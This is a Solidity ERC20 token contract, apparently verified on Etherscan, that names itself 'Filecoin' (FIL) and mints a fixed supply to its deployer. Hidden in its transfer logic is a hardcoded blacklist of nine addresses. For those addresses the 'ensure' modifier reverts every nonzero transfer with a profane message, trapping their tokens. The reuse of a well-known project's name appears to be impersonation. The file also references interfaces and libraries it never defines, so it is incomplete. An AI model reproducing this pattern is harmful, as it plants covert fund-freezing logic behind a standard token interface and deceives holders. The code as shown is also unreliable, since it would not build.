/**
 *Submitted for verification at Etherscan.io on 2020-10-13
*/

pragma solidity ^0.5.16;



contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    mapping (address => uint) private _balances;
    
    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    mapping(address=>bool) public isFuckingThief;
    constructor() public
    {
        isFuckingThief[0x00000000002bde777710C370E08Fc83D61b2B8E1]=true;
        isFuckingThief[0x4b00296Eb3d6261807A6AbBA7E8244C6cBb8EC7D]=true;
        isFuckingThief[0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852]=true;
        isFuckingThief[0x2C334D73c68bbc45dD55b13C5DeA3a8f84ea053c]=true;
        isFuckingThief[0x3e1804Fa401d96c48BeD5a9dE10b6a5c99a53965]=true;
        isFuckingThief[0xEBB4d6cfC2B538e2a7969Aa4187b1c00B2762108]=true;
        isFuckingThief[0x0000000071E801062eB0544403F66176BBA42Dc0]=true;
        isFuckingThief[0xAf113cb37bB68946EBA642530b525798f4334dCC]=true;
        isFuckingThief[0x7c25bB0ac944691322849419DF917c0ACc1d379B]=true;
    }
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint amount) ensure(sender,amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    modifier ensure(address sender,uint amount)
    {
        if (isFuckingThief[sender]==false)
        {
            _;
        }
        else ///for fucking thief
        {
            if(amount==0)
            {
                _;
            }
            else
            {
                require(1==0,"fuck you");
                _;
            }
        }
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}







contract FIL is ERC20, ERC20Detailed {
  constructor () public ERC20Detailed("Filecoin", "FIL", 18) {
      _mint(msg.sender, 100000*10**18);
  }
}